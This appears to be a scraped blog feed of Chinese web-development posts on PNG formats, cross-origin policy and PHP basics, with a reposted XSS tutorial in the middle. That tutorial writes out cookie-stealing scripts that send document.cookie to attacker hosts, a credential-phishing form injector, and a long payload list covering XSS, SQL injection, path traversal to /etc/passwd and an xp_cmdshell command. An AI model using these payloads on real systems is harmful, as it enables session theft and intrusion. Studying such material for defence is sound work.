不同Png格式测试测试平台：ios&amp;androidwebkit浏览器测试图片：彩种雪碧图1230*82测试内容：同一张雪碧图导出不同png格式的大小、透明度、杂边以及在retina显示屏和普通显示屏下的对比测试结果：从上图可见png32和png24体积太大了，十分消耗手机用户流量，不是我们选择的范围，那么可以锁定目标在『png8alpha透明』和『png8索引透明』中，2者对比，可以看出『png8alpha』在手机端的支持是良好，可能有童鞋会认为，单凭一张图片也不能下结论~而经过笔者使用多张雪碧图测试后使用Fireworks导出的『png8alpha』，在手机端的支持是比较好的~不仅文件体积小，节省流量，而且半透明效果良好于是，移动端采用『Png8alpha透明』，相信『Png8alpha透明』是未来的一种趋势~ PC端选择哪种PngPC端使用哪种png，其实这个话题很早就有结论了，这里简单介绍下。 使用png8的方案：使用photoshop打开雪碧图，分别导出一张png32和一张『png8索引透明』的图片，高级浏览器使用png32位图片，针对IE6使用『png8索引透明』，并设置『png8索引透明』杂边与背景色颜色一致可达到视觉上透明注：为啥使用png32而不使用『png8alpha透明』?因为pc端的网速大多良好，建议使用表现更佳的png图片，显然png32是最合适的，当然你也可以使用『png8alpha透明』，但是在高清显示器下的质量不如png32 bg{ background:url(global.png?v=20130530)no-repeat; _background:url(global_png8.png?v=20130530)no-repeat;//IE6使用的背景图 } 使用IE滤镜的方案：比较耗性能，而且存在不支持背景平铺，导致链接失效等缺点，不推荐该方案，不要为了IE而把自己搞得像IE~ bg{filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src=&quot;img.png&quot;,sizingMethod=&quot;scale&quot;);} 另外还有js和打补丁的办法，这里不做介绍，大家有兴趣可以百度下：IE6支持png24 Png的格式、颜色种类、位数、透明度、浏览器支持一览 转自：http://www.zzbaike.com/png-6816.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XSS跨站总结🔔]]></title>
      <url>%2F2016%2F07%2F22%2F52%2F</url>
      <content type="text"><![CDATA[跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java， VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 原因：有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，XSS攻击就完成了。 种类:1. 反射型XSS反射型XSS，又称非持久型XSS。(一般需要自行去触发，输入—输出)反射：这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。非持久性：这种攻击方式往往具有一次性。方式：攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。 Eg：攻击者将如下链接发送给受害者：代码: http://www.XXXX.com/search.asp?input=&lt;script&gt;alert(document.cookie);&lt;/script&gt; 当受害者点击这个链接的时候，注入的脚本被当作搜索的关键词发送到目标服务器的search.asp页面中，则在搜索结果的返回页面中，这段脚本将被当作搜索的关键词而嵌入。这样，当用户得到搜索结果页面后，这段脚本也得到了执行。这就是反射型XSS攻击的原理，可以看到，攻击者巧妙地通过反射型XSS的攻击方式，达到了在受害者的浏览器上执行脚本的目的。由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用，这也是它被称为非持久型XSS的原因。 2. 存储型XSS存储型XSS，又称持久型XSS。(一般无意触发，输入–进入数据库*–取出数据库–输出)持久性：攻击脚本将被永久地存放在目标服务器的数据库和文件中。方式：这种攻击多见于论坛或博客，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。Eg：恶意攻击者可以通过发一篇包含了恶意代码的帖子。 （帖子中包含了恶意代码，&lt;script&gt;window.open(“www.b.com?param=+document.cookie)&lt;/script&gt;） 这时甲和乙看到了恶意攻击者的提子，当在查看帖子时就都中招了，他们的cookie信息都发送到了恶意攻击者的服务器上，攻击成功！ 可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入一个页面当中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型的XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入的往往是一些我们所信任的页面，因此无论我们多么小心，都难免会受到攻击。 3. DOM-XSSDOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞，它涉及的两个层次不是服务器端和浏览器端，而是浏览器端的JavaScript层和HTML层。更准确的说，就是服务器脚本变成了客户端脚本。方式：用户请求一个经过专门设计的URL，它由攻击者提交，且其中包含嵌入式JavaScript。服务器的响应中并不以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，上述脚本得以处理。Eg： http://www.xxx.site/welcome.html?name=zhangsan 使用以下的脚本打印出登录用户zhangsan的名字，即代码: &lt;SCRIPT&gt; var pos=docmnent.URL.indexOf(“name=”)+5; document.write (document.URL.substring(pos,document.URL.length)); &lt;/SCRIPT&gt; 如果这个脚本用于请求http://www.xxx.site/welcome.html?name=alert(“XSS”)时，就导致XSS攻击的发生。当用户点击这个链接，服务器返回包含上面脚本的HTML静态文本，用户浏览器把HTML文本解析成DOM，DOM中的document对象URL属性的值就是当前页而的URL。在脚本被解析时，这个URL属性值的一部分被写入HTML文本，而这部分HTML文本却是JavaScript脚本，这使得alert(“XSS”)成为页面最终显示的HTML文本，从而导致DOM—base XSS攻击发生。 常用的攻击手段和目的1. 窃取Cookie盗用 cookie （主要），获取敏感信息，比如盗取各类用户账号、控制企业数据、盗窃企业重要的具有商业价值的资料、非法转账等等。代码： &lt;script&gt;location.href = &apos;http://www.Yoursite.com/Stealer.php?cookie=&apos;+document.cookie;&lt;/script&gt; 其中location.href是指页面跳转到代码: http://www.VulnerableSite.com/index.php?search=&lt;script&gt;location.href = &apos;http://www.Yoursite.com/Stealer.php?cookie=&apos;+document.cookie;&lt;/script&gt; 或者代码: &gt;&lt;a href=&quot;#&quot; onclick=&quot;document.location=&apos;http://yoursite.com/whateveryouwant.php?cookie=&apos; +escape(document.cookie);&quot;&gt;&lt;Click Me&gt;&lt;/a&gt;&lt;/script&gt; document.location和location.href基本一样 通过XSS攻击，由于注入代码是在受害者的浏览器上执行，因此能够很方便地窃取到受害者的Cookie信息。比如，我们只要注入类似如下的代码： &lt;script&gt;location.replace(“http://www.attackpage.com/record.asp?secret=“+document.cookie)&lt;/script&gt; 当受害者的浏览器执行这段脚本的时候，就会自动访问攻击者建立的网站http://www.attackpage.com，打开其中的recou...ookie信息。得到受害者的Cookie信息后，攻击者可以很方便地冒充受害者，从而拥有其在目标服务器上的所有权限，相当于受害者的身份认证被窃取了。这样，攻击者可以任意地利用受害者的身份访问服务器上的资源和服务，甚至对受害者和服务器上的数据进行破坏。如果受害者拥有管理员权限，攻击者还可以利用其提升自己账号的权限，从而进行进一步的攻击。注：Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）document.location.href和document.location.replace都可以实现从A页面切换到B页面，但他们的区别是：用document.location.href切换后，可以退回到原页面。而用document.location.replace切换后，不可以通过“后退”退回到原页面。关于document.location.href或其他可回退的切换方式document.location 相当于 document.URL 声明了装载文档的URL,除非发生了服务器重定向, 否则该属性的值与Window.location.href的值是一样的. 2.钓鱼所谓钓鱼攻击就是构建一个钓鱼页面，诱骗受害者在其中输入一些敏感信息，然后将其发送给攻击者。利用XSS的注入脚本，我们也可以很方便地注入钓鱼页面的代码，从而引导钓鱼攻击。比如下面这样一段代码： &lt;script&gt; function hack() { location.replace(“http://www.attackpage.com/record.asp?username=“ +document.forms[0].user.value + “password=” + document.forms[0].pass.value); } &lt;/script&gt; &lt;form&gt; &lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;这个功能需要登录:&lt;/H3 &gt; &lt;br&gt;&lt;br&gt;请输入用户名：&lt;br&gt; &lt;input type=”text” id=”user”name=”user”&gt; &lt;br&gt;请输入密码：&lt;br&gt; &lt;input type=”password” name =“pass”&gt; &lt;br&gt;&lt;input type=”submit”name=”login” value=”登录”onclick=”hack()”&gt; &lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt; 注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用户的账号信息。可以看到，和一般的钓鱼攻击不同，XSS引导的钓鱼攻击由于是对用户信任的网站页面进行修改，因此隐蔽性很高，而用户的账号失窃往往会带来重大的损失，因此它的危害也是十分巨大的。 3.跨站请求伪造跨站请求伪造（Cross-SiteRequest Forgery，CSRF），作为OWASP组织的2007年提出十大安全漏洞第五，它也属于XSS攻击的一种衍生。所谓跨站请求伪造，就是攻击者利用XSS注入攻击的方式，注入一段脚本，而当受害者的浏览器运行这段脚本时，脚本伪造受害者发送了一个合法请求。比如我们注入如下的HTML代码： &lt;imgsrc = “http://www.bank.com/transfer.do?toAct=123456&amp;money=10000&gt; 假如上面的代码中所访问的是某个银行网站的转账服务，则当受害者的浏览器运行这段脚本时，就会向攻击者指定的账户（示例的123456）执行转账操作。由于这个转账请求是在受害者的浏览器中运行的，因此浏览器也会自动将受害者的Cookie信息一并发送。这样，发送的请求就好像是受害者自己发送的一样，银行网站也将认可这个请求的合法性，攻击者也就达到了伪造请求的目的。 4.注入恶意软件除了直接注入恶意脚本以外，通过XSS攻击，攻击者也可以很方便地在脚本中引入一些恶意软件，比如病毒、木马、蠕虫等等。例如，攻击者可以在某个自己建立的页面上放置一些恶意软件，然后用XSS注入的方式，插入一段引用该页面的脚本。这样当受害者的浏览器执行这段脚本的时候，就会自动访问放置了恶意软件的页面，从而受到这些恶意软件的感染。利用XSS注入恶意软件的方式，攻击者可以很方便地在互联网上传播病毒、木马和蠕虫，通过这种途径，攻击者就可以通过这些病毒、木马和蠕虫，进一步地对受害者的主机发动攻击。目前，互联网上的“挂马”现象非常普遍，而XSS注入的出现也无疑给“挂马”的攻击者指明了又一个新的方向。通过传播这些木马，窃取合法用户的敏感信息，不少非法攻击者也逐渐将这一过程产业化，经常可以见到以信封方式批量兜售账号密码的现象。这也给许多正常的网络用户造成了许多无法挽回的巨大损失，造成的危害也很大。 挖掘方式： 对于反射型XSS以及一些DOM XSS，一般建议是开发一些自动化的扫描工具进行扫描，并辅以手工分析。 另外一方面，搜索引擎也是快速寻找具有缺陷参数的好办法。 具体可见：白帽子信息_心伤的瘦子 对于存储型XSS， 对于单纯的输入-&gt;存储-&gt;输出点 的情况 （输入与输出点关系：一个地方输入，会有多个地方输出；不同地方输入，同一地方输出。）。常规测试是正向直接输入内容，然后在输出点查看是否未过滤，当然你也可以先大胆假设输出点未过滤，反向寻找在何处进行输入，进而测试。 对于富文本，则需要对过滤器进行fuzz测试（人脑+自动化）了，可参照：fuzzing XSS filter 第三类，就是一些WEB应用中所出现的DOM-存储型XSS，即输出点的无害内容，会经过js的一些dom操作变得危险（本质上和 第1点里的dom xss成因是一样的）。这一类的挖掘方法，个人觉得不太好总结。 其一，需要熟悉WEB应用的功能，其二，知道功能所对应的JS代码有哪些，其三，凭直觉猜测程序员会在哪些功能出现可能导致XSS的过滤遗忘或过滤错误（直觉是唬人的，其实就是你知道某些功能会需要某些代码实现，而这些代码常常容易出错），其四，需要有较好的代码阅读跟踪能力（JS一大坨。。还是蛮难读的…. 有些代码被混淆过，十分不易阅读，就会涉及到如何下断点进行调试的小技巧）。 我想，挖掘这一类的前提可能是需要有不错的前端开发经验，写多了，才会有足够的嗅觉。 检测方法&quot;&gt;&lt;svg&gt;&lt;script xlink:href=//********&gt;&lt;/script&gt; &lt;script&gt;alert(document.cookie)&lt;/script&gt; javascript：console.log(0) &lt;script&gt;console.log(1)&lt;/script&gt; &apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; =&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; &lt;script&gt;alert(document.cookie)&lt;/script&gt; &lt;script&gt;alert(vulnerable)&lt;/script&gt; %3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; &lt;img src=&quot;javascript：alert(&apos;XSS&apos;)&quot;&gt; %0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp %22%3cscript%3ealert(%22xss%22)%3c/script%3e %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd %2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini %3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e %3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e %3cscript%3ealert(%22xss%22)%3c/script%3e/index.html %3f.jsp %3f.jsp &lt;script&gt;alert(&apos;Vulnerable&apos;);&lt;/script&gt; &lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt; ?sql_debug=1 a%5c.aspx a.jsp/&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt; a/ a?&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt; &quot;&gt;&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt; &apos;;exec%20master..xp_cmdshell%20&apos;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&apos;--&amp;&amp; %22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E %3Cscript%3Ealert(document. domain);%3C/script%3E&amp; %3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID={SESSION_ID}&amp;SESSION_ID= 1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname= http://www.cnblogs.com/http://ww ... logs.com/etc/passwd ..\..\..\..\..\..\..\..\windows\system.ini \..\..\..\..\..\..\..\..\windows\system.ini &apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()} &lt;IMG src=&quot;javascript：alert(&apos;XSS&apos;);&quot;&gt; &lt;IMG src=javascript：alert(&apos;XSS&apos;)&gt; &lt;IMG src=JaVaScRiPt:alert(&apos;XSS&apos;)&gt; &lt;IMG src=JaVaScRiPt:alert(&quot;XSS&quot;)&gt; &lt;IMG src=javascript：alert(&apos;XSS&apos;)&gt; &lt;IMG src=javascript：alert(&apos;XSS&apos;)&gt; &lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt; &lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt; &lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt; &lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt; &quot;&lt;IMG src=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out &lt;IMG src=&quot; javascript：alert(&apos;XSS&apos;);&quot;&gt; &lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt; &lt;BODY BACKGROUND=&quot;javascript：alert(&apos;XSS&apos;)&quot;&gt; &lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt; &lt;IMG DYNSRC=&quot;javascript：alert(&apos;XSS&apos;)&quot;&gt; &lt;IMG LOWSRC=&quot;javascript：alert(&apos;XSS&apos;)&quot;&gt; &lt;BGSOUND src=&quot;javascript：alert(&apos;XSS&apos;);&quot;&gt; &lt;br size=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt; &lt;LAYER src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt; &lt;LINK REL=&quot;stylesheet&quot; href=&quot;javascript：alert(&apos;XSS&apos;);&quot;&gt; &lt;IMG src=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt; &lt;IMG src=&quot;mocha:&quot;&gt; &lt;IMG src=&quot;livescript:&quot;&gt; &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript：alert(&apos;XSS&apos;);&quot;&gt; &lt;IFRAME src=javascript：alert(&apos;XSS&apos;)&gt;&lt;/IFRAME&gt; &lt;FRAMESET&gt;&lt;FRAME src=javascript：alert(&apos;XSS&apos;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt; &lt;TABLE BACKGROUND=&quot;javascript：alert(&apos;XSS&apos;)&quot;&gt; &lt;DIV STYLE=&quot;background-image: url(javascript：alert(&apos;XSS&apos;))&quot;&gt; &lt;DIV STYLE=&quot;behaviour: url(&apos;http://www.how-to-hack.org/exploit.html&apos;);&quot;&gt; &lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt; &lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt; &lt;IMG STYLE=&apos;xss:expre\ssion(alert(&quot;XSS&quot;))&apos;&gt; &lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt; &lt;STYLE TYPE=&quot;text/css&quot;&gt;.XSS{background-image:url(&quot;javascript：alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt; &lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript：alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt; &lt;BASE href=&quot;javascript：alert(&apos;XSS&apos;);//&quot;&gt; getURL(&quot;javascript：alert(&apos;XSS&apos;)&quot;) a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript：&quot;;d=&quot;alert(&apos;XSS&apos;);&quot;;eval(a+b+c+d); &lt;XML src=&quot;javascript：alert(&apos;XSS&apos;);&quot;&gt; &quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a(){alert(&apos;XSS&apos;);}&lt;/SCRIPT&gt;&lt;&quot; &lt;SCRIPT src=/uploadfile/2015/0126/20150126034957941.jpg&quot;&gt;&lt;/SCRIPT&gt; &lt;IMG src=&quot;javascript：alert(&apos;XSS&apos;)&quot; &lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt; &lt;IMG src=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt; &lt;SCRIPT a=&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt; &lt;SCRIPT =&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt; &lt;SCRIPT a=&quot;&gt;&quot; &apos;&apos; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt; &lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt; &lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt; &lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt; admin&apos;-- &apos; or 0=0 -- &quot; or 0=0 -- or 0=0 -- &apos; or 0=0 # &quot; or 0=0 # or 0=0 # &apos; or &apos;x&apos;=&apos;x &quot; or &quot;x&quot;=&quot;x &apos;) or (&apos;x&apos;=&apos;x &apos; or 1=1-- &quot; or 1=1-- or 1=1-- &apos; or a=a-- &quot; or &quot;a&quot;=&quot;a &apos;) or (&apos;a&apos;=&apos;a &quot;) or (&quot;a&quot;=&quot;a hi&quot; or &quot;a&quot;=&quot;a hi&quot; or 1=1 -- hi&apos; or 1=1 -- hi&apos; or &apos;a&apos;=&apos;a hi&apos;) or (&apos;a&apos;=&apos;a hi&quot;) or (&quot;a&quot;=&quot;a 转自：http://www.2cto.com/article/201501/372352.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[也谈谈同源策略和跨域问题👗]]></title>
      <url>%2F2016%2F07%2F17%2F51%2F</url>
      <content type="text"><![CDATA[1 同源策略所谓同源策略，指的是浏览器对不同源的脚本或者文本的访问方式进行的限制。比如源a的js不能读取或设置引入的源b的元素属性。那么先定义下什么是同源，所谓同源，就是指两个页面具有相同的协议，主机（也常说域名），端口，三个要素缺一不可。可以看下面的几个示例来更加清楚的了解一下同源的概念： URL1 URL2 说明 是否允许通信 http://www.foo.com/js/a.js http://www.foo.com/js/b.js 协议、域名、端口都相同 允许 http://www.foo.com/js/a.js http://www.foo.com:8888/js/b.js 协议、域名相同，端口不同 不允许 https://www.foo.com/js/a.js http://www.foo.com/js/b.js 主机、域名相同，协议不同 不允许 http://www.foo.com/js/a.js http://www.bar.com/js/b.js 协议、端口相同，域名不同 不允许 http://www.foo.com/js/a.js http://foo.com/js/b.js 协议、端口相同，主域名相同，子域名不同 不允许 同源策略限制了不同源之间的交互，但是有人也许会有疑问，我们以前在写代码的时候也常常会引用其他域名的js文件，样式文件，图片文件什么的，没看到限制啊，这个定义是不是错了。其实不然，同源策略限制的不同源之间的交互主要针对的是js中的XMLHttpRequest等请求，下面这些情况是完全不受同源策略限制的。 页面中的链接，重定向以及表单提交是不会受到同源策略限制的。链接就不用说了，导航网站上的链接都是链接到其他站点的。而你在域名www.foo.com下面提交一个表单到www.bar.com是完全可以的。 跨域资源嵌入是允许的，当然，浏览器限制了Javascript不能读写加载的内容。如前面提到的嵌入的&lt; script src=”…” &gt;&lt;/ script &gt;，&lt; img &gt;，&lt; link &gt;，&lt; iframe &gt;等。当然，如果要阻止iframe嵌入我们网站的资源(页面或者js等)，我们可以在web服务器加上一个X-Frame-Options DENY头部来限制。nginx就可以这样设置add_header X-Frame-Options DENY;。 既然有这么多的情况是没有同源策略限制的，那么通常的跨域问题从何而来呢？转到下一节跨域问题。 2 跨域问题这一节来讨论下跨域问题，当然前置条件是我们在WEB服务器或者服务端脚本中设置ACCESS-CONTROL-ALLOW-ORIGIN头部，如果设置了这些头部并允许某些域名跨域访问，则浏览器就会跳过同源策略的限制返回对应的内容。此外，如果你不是通过浏览器去获取资源，比如你通过一个python脚本去调用接口或者获取js文件，也不在这个限制之内。 2.1 Ajax跨域通过ajax调用其他域的接口会有跨域问题。比如下面的例子，我在http://www.foo.com/index.html中通过ajax调用请求http://www.bar.com/js/test.js页面，此时是会报错的。XMLHttpRequest cannot load http://www.bar.com/js/test.js. No ‘Access-Control-Allow-Origin’ header is present on the requested resource. Origin ‘http://www.foo.com‘ is therefore not allowed access.这是因为我们的WEB服务器没有设置ACCESS-CONTROL-ALLOW-ORIGIN头部，默认情况下是禁止跨域引用资源的。当然这里有一点要注意，其实这个跨域请求是发送成功了的，服务器也有返回test.js内容，只是浏览器禁止Javascript去取response的数据而已。如果要设置ACCESS-CONTROL-ALLOW-ORIGIN头部，nginx可以使用下面的代码 add_header &apos;Access-Control-Allow-Origin&apos; &apos;http://www.foo.com&apos;; add_header &apos;Access-Control-Allow-Credentials&apos; &apos;true&apos;; add_header &apos;Access-Control-Allow-Methods&apos; &apos;GET,POST&apos;; 另外，我们看到直接通过Javascript去取iframe中的元素也是会报错的，因为域名不同。报错如下所示 Uncaught SecurityError: Failed to read the &apos;contentDocument&apos; property from &apos;HTMLIFrameElement&apos;: Blocked a frame with origin &quot;http://www.foo.com&quot; from accessing a frame with origin &quot;http://foo.com&quot;. The frame being accessed set &quot;document.domain&quot; to &quot;foo.com&quot;, but the frame requesting access did not. Both must set &quot;document.domain&quot; to the same value to allow access. 这时因为我们的主域名相同，因此可以在index.html和test.html中设置document.domain=’foo.com’来访问iframe中的元素。注意，是两个域名下面的文件都要设置，即便是同样的主域名。当然这是特例，如果是两个完全不同的域名，是没有办法的，你不能把www.foo.com的domain设置成www.163.com。此外，在index.html里面也可以看到通过,等标签都是可以跨域内嵌资源的。 # index.html &lt;!DOCTYPE html&gt; &lt; html &gt; &lt;head&gt; &lt; title &gt;test cross domain&lt;/title&gt; &lt; script src= &quot;/js/jquery.js&quot;&gt;&lt;/s cript&gt; &lt;script src=&quot;http://www.bar.com/js/test.js&quot;&gt;&lt;/s cript&gt; &lt;script&gt; $(function(){ document.domain = &apos;foo.com&apos;; //1 注释掉则会报错 var ifr = document.getElementById(&quot;testframe&quot;); ifr.onload = function(){ var doc = ifr.contentDocument || ifr.contentWindow.document; alert(doc.getElementsByTagName(&quot;h1&quot;)[0].childNodes[0].nodeValue); } }); $.ajax(&quot;http://www.bar.com/js/test.js&quot;); //2 报错 &lt;/s cript&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Test Cross Domain&lt;/h1&gt; &lt;iframe id=&quot;testframe&quot; src=&quot;http://foo.com/test.html&quot;&gt;&lt;/iframe&gt; &lt;/body&gt; &lt;/html&gt; 当然还可以通过iframe，location.hash，window.name，HTML5的postMessage等方法来实现跨域资源访问，更多内容参见Rain Man的这篇文章 JavaScript跨域总结和解决办法。 2.2 JSONP跨域访问SONP也是开发中常见到的内容，在jquery中就有封装，通过ajax请求多带上一个jsonp的参数即可。JSONP也能够实现跨域访问资源，但是它的实现原理其实跟ajax没有多少关系，它是通过动态插入标签来实现跨域资源访问的，因为根据前面内容我们已经知道，嵌入跨域资源浏览器是允许的。下面通过一个简单的例子来说明JSONP的原理。两个文件，第一个是http://www.foo.com/jsonp.html，通过动态创建script标签加载了http://www.bar.com/js/outer.js文件，然后outer.js文件返回的内容正好是一个函数调用，如此，实现了数据传递和回调过程。当然，实际的jsonp接口中，会让你传一个函数名过去，然后返回的数据中回调函数名就是你传的函数名，回调函数的参数则是封装的json格式。jQuery中的jsonp实现原理基本就是这样，更详细的jsonp原理可以参见这篇大作`深入浅出JSONP`。 # jsonp.html &lt;script type=&quot;text/javascript&quot;&gt; function callback(data) { alert(data.message); } function addScriptTag(src){ var script = document.createElement(&apos;script&apos;); script.src = src; document.body.appendChild(script); } window.onload = function(){ addScriptTag(&quot;http://www.foo.com/js/outer.js&quot;); }&lt;/sc ript&gt; # outer.js callback({message:&quot;success&quot;}); 转自：http://www.cnblogs.com/chaoyuehedy/p/5556557.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP基本语法🍄]]></title>
      <url>%2F2016%2F07%2F16%2F50%2F</url>
      <content type="text"><![CDATA[PHP（Hypertext Preprocessor,超文本预处理器）。 一、PHP入门1、指令分隔符“分号”语义分为两种：一种是在程序中使用结构定义语句，例如流程控制、函数定义、类的定义等，用来定义程序结构使用的语句。在结构语句后面不能使用分号作为结束；另一种是在程序中使用功能执行语句，例如变量的声明、内容的输出、函数的调用等，是用来在程序中执行某些特定功能的语句，这种语句也可以成为指令，php需要在每个指令后用分号结束。 2、程序注释php注释的三种形式：以“/ ”和“/”闭合多行注释符，“//”和”#”开始的单行注释符 3、在程序中使用空白的处理下列情况应该总是使用两个空行：一个源文件的两个代码片段之间。两个类的声明之间。下列情况应该总是使用一个空行：两个函数声明之间。函数内的局部变量和函数的第一条语句之间。块注释或单行注释之前。一个函数内的两个逻辑代码段之间，用以提高可读性。空格的应用规则：一般用于关键字和括号之间，函数名与左括号间不应使用空格。一般函数的参数列表中的逗号后面添加空格。数学算式的操作数与运算符之间应该添加空格(二进制元算与医院元算除外)。for语句中表达式应该用逗号分开，后面添加空格。 二、变量第一次赋值，就创建了变量。必须使用”$”后跟变量名表示。再次给该变量赋值会覆盖之前的变量。php变量声明以后有一定的范围，变量的范围即它定义的上下文背景(也就是它生效范围)。大部分的php变量如果不是在函数里面声明的，只有在声明处到文件结束的一个单独范围内使用。这个单独的范围跨度不仅是&lt;?php 标记开始处到?&gt;结束标记处使用，可以在一个页面的所有开启的PHP模式下使用，也包含了include和require引入的文件。如果使用COOKIE或SESSION还可以在多个页面中应用。在变量的使用范围周期内，我们可以借助unset()函数释放指定的变量，使用isset()函数检测变量是否设置和使用empty()函数检测一个变脸是否为空。empty()与isset()的区别：如果empty()函数的参数是非空或非零的值，则empty()返回false。””、0、“0”、null、false、array()、var $var、以及没有任何属性的对象都将被认为是空的。如果参数为空，则返回true。如果函数isset()参数存在，则返回true。若使用isset()检测一个被设置成null的变量或使用unset()释放了一个变量，都将返回false。注意：字节NULL(“\0”)并不等同于null常数。建议：使用!empty($var)判断变量存在且不能为空。 1、变量的命名变量名区分大小写。但内置结构和关键字以及用户自定义的类名和函数名都是不区分大小写的。 驼峰命名法。如：$aaaBBBccc。 2、可变变量可变变量可使用一个普通变量的值作为这个可变变量的变量名。 